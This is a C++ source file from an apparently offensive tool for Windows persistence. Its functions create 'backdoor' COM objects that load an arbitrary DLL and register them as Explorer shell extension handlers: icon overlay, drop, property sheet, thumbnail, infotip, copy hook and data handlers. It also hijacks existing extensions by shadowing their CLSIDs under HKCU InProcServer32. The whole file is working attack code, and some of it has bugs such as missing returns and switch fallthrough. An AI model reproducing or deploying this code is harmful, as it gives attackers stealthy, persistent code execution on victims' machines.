#include "reg.h"
#include "logging.h"
#include <cwchar>

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

namespace reg {

	// <chatGPT>
	WCHAR* QueryFirstSubKey(HKEY hKey) {
		WCHAR    achKey[MAX_KEY_LENGTH];
		DWORD    cbName;
		DWORD    cSubKeys = 0;
		DWORD retCode;

		WCHAR  achValue[MAX_VALUE_NAME];
		DWORD cchValue = MAX_VALUE_NAME;

		// Get the number of subkeys. 
		retCode = RegQueryInfoKey(
			hKey,
			NULL,
			NULL,
			NULL,
			&cSubKeys,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL);

		if (cSubKeys) {
			cbName = MAX_KEY_LENGTH;
			retCode = RegEnumKeyExW(hKey, 0,
				achKey,
				&cbName,
				NULL,
				NULL,
				NULL,
				NULL);
			if (retCode == ERROR_SUCCESS) {
				HKEY hSubKey;
				if (RegOpenKeyExW(hKey, achKey, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
					DWORD bufSize = MAX_PATH;
					static WCHAR buffer[MAX_PATH] = TEXT("");

					if (RegQueryValueExW(hSubKey, NULL, NULL, NULL, (LPBYTE)buffer, &bufSize) == ERROR_SUCCESS) {
						RegCloseKey(hSubKey);
						return buffer;
					}

					RegCloseKey(hSubKey);
				}
			}
		}

		return NULL;
	}
	WCHAR* QueryRegistryValue(HKEY hKey) {
		DWORD bufSize = MAX_PATH;
		static WCHAR buffer[MAX_PATH] = TEXT("");

		if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &bufSize) == ERROR_SUCCESS) {
			logging::log(LVL_INFO, L"Got the CLSID for Hijacking!");
			return buffer;
		}
		else {
			logging::log(LVL_FATAL, L"Error: Unable obtain CLSID for hijacking (perhaps extension isnt installed?) ");
		}
	}
	// </chatGPT>


	std::wstring ResolveProgId(CONST WCHAR* ext) {

		HKEY  hkResult = NULL;
		std::wstring logstr;
		LSTATUS stat = NULL;
		WCHAR* buf1;
		BYTE* buf2;
		HANDLE hHeap = NULL;

		hHeap = GetProcessHeap();


		buf1 = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_VALUE_NAME + 2);
		buf2 = (BYTE*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_VALUE_NAME + 2);


		DWORD sz1 = MAX_VALUE_NAME;
		DWORD sz2 = MAX_VALUE_NAME;

		logstr = L"Resolving ProgID for " + std::wstring(ext);
		logging::log(LVL_INFO, logstr.c_str());

		stat = RegOpenKeyExW(HKEY_CLASSES_ROOT, ext, NULL, KEY_QUERY_VALUE, &hkResult);
		if (stat == ERROR_SUCCESS) {

			stat = RegEnumValueW(hkResult, NULL, buf1, &sz1, NULL, NULL, buf2, &sz2);
			if (stat == ERROR_SUCCESS) {

				logstr = L"Successfully Resolved ProgId for the Extension (" + std::wstring((WCHAR*)buf2) + L")";
				logging::log(LVL_INFO, logstr.c_str());
				std::wstring ret = (WCHAR*)buf2;

				HeapFree(hHeap, NULL, buf1);
				HeapFree(hHeap, NULL, buf2);

				return ret;

			}
			else {

				HeapFree(hHeap, NULL, buf1);
				HeapFree(hHeap, NULL, buf2);
				logging::log(LVL_FATAL, L"Unable to Resolve ProgId for the Extension");

			}

		}
		else {

			HeapFree(hHeap, NULL, buf1);
			HeapFree(hHeap, NULL, buf2);
			logging::log(LVL_FATAL, L"Error Opening Key");

		}

	}

	std::wstring CreateSubKey(WCHAR* ext, const WCHAR* subKey) {

		std::wstring progId;
		if (ext) {

			progId = ResolveProgId(ext);

		}
		else {

			progId = L"*";

		}
		progId.append(subKey);
		return progId;

	}

	HKEY AddKey(HKEY hKey, CONST WCHAR* subkey) {


		LSTATUS status = NULL;
		HKEY hkResult = NULL;
		HRESULT hResult = NULL;
		OLECHAR* guidString = { 0 };
		DWORD dwKeyRights = KEY_READ | KEY_WRITE | KEY_SET_VALUE;


		std::wstring logmsg = L"Adding New Registry Key ";

		if (hKey == HKEY_LOCAL_MACHINE) logmsg.append(L"HKEY_LOCAL_MACHINE\\");
		else if (hKey == HKEY_CURRENT_USER) logmsg.append(L"HKEY_CURRENT_USER\\");
		else if (hKey == HKEY_CLASSES_ROOT) logmsg.append(L"HKEY_CLASSES_ROOT\\");
		else if (hKey == HKEY_CURRENT_CONFIG) logmsg.append(L"HKEY_CURRENT_CONFIG\\");
		else if (hKey == HKEY_PERFORMANCE_DATA) logmsg.append(L"HKEY_PERFORMANCE_DATA\\");
		else if (hKey == HKEY_PERFORMANCE_NLSTEXT) logmsg.append(L"HKEY_PERFORMANCE_NLSTEXT\\");
		else if (hKey == HKEY_PERFORMANCE_TEXT) logmsg.append(L"HKEY_PERFORMANCE_TEXT\\");

		logmsg += std::wstring(subkey);

		logging::log(LVL_INFO, logmsg.c_str());
		status = RegCreateKeyExW(hKey, subkey, NULL, NULL, REG_OPTION_NON_VOLATILE, dwKeyRights, NULL, &hkResult, NULL);
		if (status == ERROR_SUCCESS) {

			logging::log(LVL_INFO, L"Successfully Created New Registry Key");
			return hkResult;


		}
		else {

			logging::log(LVL_FATAL, L"Error Creating New Registry Key");

		}



	}

	LSTATUS AddDefaultValue(HKEY hkResult, GUID guid) {

		HRESULT hResult;
		OLECHAR* guidString;

		hResult = StringFromCLSID(guid, &guidString);
		size_t sz = wcslen(guidString);
		return RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE*)guidString, (DWORD)sz * 2 + 2);

	}

	GUID CreateBackdoorObj(_In_ BYTE Type, _In_ std::wstring DllPath) {

		LSTATUS status = NULL;
		HKEY hkResult = NULL;
		HKEY hKey = NULL;

		switch (Type) {

		case HKCU:
			hKey = HKEY_CURRENT_USER;
			break;
		case HKCR:
			hKey = HKEY_CLASSES_ROOT;
			break;
		case HKLM:
			hKey = HKEY_LOCAL_MACHINE;
			break;

		}


		GUID objGuid = { NULL };
		HRESULT hResult = NULL;
		OLECHAR* guidString;
		DWORD dwKeyRights = KEY_READ | KEY_WRITE | KEY_SET_VALUE;
		std::wstring subKey;
		std::wstring logmsg;


		hResult = CoCreateGuid(&objGuid);
		if (hResult == S_OK) {

			hResult = StringFromCLSID(objGuid, &guidString); // need to check this

			if (hKey == HKEY_CURRENT_USER) {
				subKey = L"Software\\Classes\\CLSID\\" + std::wstring(guidString) + L"\\InProcServer32";
			}
			else {

				subKey = L"CLSID\\" + std::wstring(guidString) + L"\\InProcServer32";

			}

			CoTaskMemFree(guidString);

			logmsg = L"Creating Backdoor COM Object Reg Key ";
			logmsg = logmsg + std::wstring((hKey == HKEY_CLASSES_ROOT) ? L"HKCR\\" : L"HKCU\\") + subKey;
			logging::log(LVL_INFO, logmsg.c_str());
			hkResult = AddKey(hKey, subKey.c_str());
			if (hkResult) {

				status = RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE*)DllPath.c_str(), (DWORD)DllPath.size() * 2);
				if (status == ERROR_SUCCESS) {

					const WCHAR* ThreadingModel = L"Apartment";
					status = RegSetValueExW(hkResult, L"ThreadingModel", NULL, REG_SZ, (const BYTE*)ThreadingModel, sizeof(ThreadingModel) * 2 + 2);

					if (status == ERROR_SUCCESS) {

						return objGuid;

					}
					else {

						// error adding reg value (ThreadingModel)
						logging::log(LVL_FATAL, L"Unable to Register Values (ThreadingModel)");

					}

				}
				else {

					// error adding reg value (DLL Path)
					CloseHandle(hkResult);
					logging::log(LVL_FATAL, L"Unable to Register Values (DLLPATH)");

				}

			}
			else {

				// error creating reg key
				logging::log(LVL_FATAL, L"Error Creating Registry Key");

			}

		}
		else {

			logging::log(LVL_FATAL, L"Error Generating GUID");

		}

		return objGuid;


	}

	BOOL AddTechnique(_In_ BYTE type, _In_opt_ WCHAR* ext, _In_ GUID Guid) {

		LSTATUS status = NULL;
		HKEY hkResult = NULL;
		HRESULT hResult = NULL;

		std::wstring strExt;
		std::wstring progId;


		switch (type) {

		case ICON_OVERLAY:

			hkResult = AddKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\BackdoorOverlay\\");
			if (hkResult) {

				status = AddDefaultValue(hkResult, Guid);
				if (status == ERROR_SUCCESS) {

					logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Overlay Handler");
					break;

					OLECHAR* guidString;
					hResult = StringFromCLSID(Guid, &guidString);
					size_t sz = wcslen(guidString);
					status = RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE*)guidString, (DWORD)sz * 2 + 2);
					if (status == ERROR_SUCCESS) {

						logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Overlay Handler");

					}
					else {

						logging::log(LVL_FATAL, L"Unable to Set Backdoor ICON Overlay Handler");

					}

					break;
				}
				break;
		case ICON_HANDLER:

			progId = CreateSubKey(ext, L"\\shellex\\IconHandler");
			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
			if (hkResult) {

				status = AddDefaultValue(hkResult, Guid);
				if (status == ERROR_SUCCESS) {

					logging::log(LVL_INFO, L"Successfully Created Backdoor ICON Handler");
					break;
				}
				else {

					logging::log(LVL_FATAL, L"Unable to Set Backdoor ICON Handler");

				}
				break;
			}
			else {
				logging::log(LVL_FATAL, L"Unable to Create Subkey");
			}

		case DROP_HANDLER:

			progId = CreateSubKey(ext, L"\\shellex\\DropHandler");
			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
			if (hkResult) {

				status = AddDefaultValue(hkResult, Guid);
				if (status == ERROR_SUCCESS) {

					logging::log(LVL_INFO, L"Successfully Created Backdoor DROP Handler");
					break;
				}
				else {

					logging::log(LVL_FATAL, L"Unable to Set Backdoor DROP Handler");

				}
				break;
			}
			else {
				logging::log(LVL_FATAL, L"Unable to Create Subkey");
			}

		case PROPERTY_SHEET_HANDLER:

			progId = CreateSubKey(ext, L"\\shellex\\PropertySheetHandlers\\BackdoorHandler");
			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
			if (hkResult) {

				status = AddDefaultValue(hkResult, Guid);
				if (status == ERROR_SUCCESS) {

					logging::log(LVL_INFO, L"Successfully Created Backdoor DROP Handler");
					break;
				}
				else {

					logging::log(LVL_FATAL, L"Unable to Set Backdoor DROP Handler");

				}
				break;
			}
			else {
				logging::log(LVL_FATAL, L"Unable to Create Subkey");
			}

		case THUMBNAIL_IMAGE_HANDLER:

			progId = CreateSubKey(ext, L"\\shellex\\{E357FCCD-A995-4576-B01F-234630154E96}\\");
			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
			if (hkResult) {

				status = AddDefaultValue(hkResult, Guid);
				if (status == ERROR_SUCCESS) {

					logging::log(LVL_INFO, L"Successfully Created Backdoor Thumbnail Image Handler");
					break;
				}
				else {

					logging::log(LVL_FATAL, L"Unable to Set Backdoor Thumbnail Image Handler");

				}
				break;
			}
			else {
				logging::log(LVL_FATAL, L"Unable to Create Subkey");
			}

		case INFOTIP_HANDLER:

			progId = CreateSubKey(ext, L"\\shellex\\{00021500-0000-0000-C000-000000000046}");
			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
			if (hkResult) {

				status = AddDefaultValue(hkResult, Guid);
				if (status == ERROR_SUCCESS) {

					logging::log(LVL_INFO, L"Successfully Created Backdoor Thumbnail Image Handler");
					break;
				}
				else {

					logging::log(LVL_FATAL, L"Unable to Set Backdoor Thumbnail Image Handler");

				}
			}
			else {
				logging::log(LVL_FATAL, L"Unable to Create Subkey");
			}
		case COPY_HOOK_HANDLER:

			progId = (L"Directory\\shellex\\CopyHookHandlers\\BackdoorHandler");
			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
			if (hkResult) {

				status = AddDefaultValue(hkResult, Guid);
				if (status == ERROR_SUCCESS) {

					logging::log(LVL_INFO, L"Successfully Created Backdoor CopyHookHandlers");
					break;
				}
				else {

					logging::log(LVL_FATAL, L"Unable to Set Backdoor CopyHookHandlers");

				}
				break;
			}
			break;

		case DATA_HANDLER:

			progId = CreateSubKey(ext, L"\\shellex\\DataHandler");
			hkResult = AddKey(HKEY_CLASSES_ROOT, progId.c_str());
			if (hkResult) {

				status = AddDefaultValue(hkResult, Guid);
				if (status == ERROR_SUCCESS) {

					logging::log(LVL_INFO, L"Successfully Created Backdoor DATA Handler");
					break;
				}
				else {

					logging::log(LVL_FATAL, L"Unable to Set Backdoor DATA Handler");

				}
				break;
			}
			else {
				logging::log(LVL_FATAL, L"Unable to Create Subkey");
			}

			}


		}

		return TRUE;

	}

	BOOL Hijack(BYTE Type, WCHAR* ext, std::wstring dllPath)
	{

		HKEY hKey = NULL;
		HKEY phkResult;
		LSTATUS status;
		std::wstring subKey;
		std::wstring progId;
		WCHAR* clsid = NULL;
		std::wstring clsidSubkey;
		// step 1 set type 

		switch (Type) {

		case ICON_OVERLAY:

			hKey = HKEY_LOCAL_MACHINE;
			progId = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\";
			break;

		case ICON_HANDLER:

			hKey = HKEY_CLASSES_ROOT;
			progId = CreateSubKey(ext, L"\\shellex\\IconHandler");
			break;

		case DROP_HANDLER:

			hKey = HKEY_CLASSES_ROOT;
			progId = CreateSubKey(ext, L"\\shellex\\DropHandler");
			break;

		case PROPERTY_SHEET_HANDLER:

			hKey = HKEY_CLASSES_ROOT;
			progId = CreateSubKey(ext, L"\\shellex\\PropertySheetHandlers");
			break;

		case THUMBNAIL_IMAGE_HANDLER:

			hKey = HKEY_CLASSES_ROOT;
			progId = CreateSubKey(ext, L"\\shellex\\{E357FCCD-A995-4576-B01F-234630154E96}\\");
			break;

		case INFOTIP_HANDLER:

			hKey = HKEY_CLASSES_ROOT;
			progId = CreateSubKey(ext, L"\\shellex\\{00021500-0000-0000-C000-000000000046}");
			break;

		case COPY_HOOK_HANDLER:

			hKey = HKEY_CLASSES_ROOT;
			progId = L"Directory\\shellex\\CopyHookHandlers";
			break;

		case DATA_HANDLER:

			hKey = HKEY_CLASSES_ROOT;
			progId = CreateSubKey(ext, L"\\shellex\\DataHandler");
			break;

		}

		// step 2 read possible shell extension

		switch (Type) {

		case ICON_OVERLAY:
		case PROPERTY_SHEET_HANDLER:
		case COPY_HOOK_HANDLER:
			// enum subkeys

			// identify extension CLSID
			status = RegOpenKeyW(hKey, progId.c_str(), &phkResult);
			if (status == ERROR_SUCCESS) {
				clsid = QueryFirstSubKey(phkResult);
				break;
			}
			else {

				logging::log(LVL_FATAL, L"Unable to Open Subkey For Hijacking");

			}


		case ICON_HANDLER:
		case DROP_HANDLER:
		case THUMBNAIL_IMAGE_HANDLER:
		case INFOTIP_HANDLER:
		case DATA_HANDLER:

			status = RegOpenKeyW(hKey, progId.c_str(), &phkResult);
			if (status == ERROR_SUCCESS) {
				clsid = QueryRegistryValue(phkResult);
				break;
			}
			else {

				logging::log(LVL_FATAL, L"Unable to Open Subkey For Hijacking");

			}

			break;

		}

		// step 3 write backdoor object

		clsidSubkey = L"Software\\Classes\\CLSID\\" + std::wstring(clsid) + L"\\InProcServer32";
		std::wstring loggingMsg = L"Creating Subkey HKCU\\" + clsidSubkey;
		logging::log(LVL_INFO, loggingMsg.c_str());
		phkResult = AddKey(HKEY_CURRENT_USER, clsidSubkey.c_str());
		if (phkResult) {
			status = RegSetValueExW(phkResult, NULL, NULL, REG_SZ, (const BYTE*)dllPath.c_str(), (DWORD)dllPath.size() * 2);
			if (status == ERROR_SUCCESS) {

				const WCHAR* ThreadingModel = L"Apartment";

				status = RegSetValueExW(phkResult, L"ThreadingModel", NULL, REG_SZ, (const BYTE*)ThreadingModel, sizeof(ThreadingModel) * 2 + 2);

				if (status == ERROR_SUCCESS) {

					logging::log(LVL_INFO, L"Successfully Created COM Hijack");
					return TRUE;

				}
				else {

					// error adding reg value (ThreadingModel)
					logging::log(LVL_FATAL, L"Unable to Register Values (ThreadingModel)");

				}


			}
			else {

				logging::log(LVL_FATAL, L"Unable create COM Hijack");

			}

			return 0;
		}



	}
}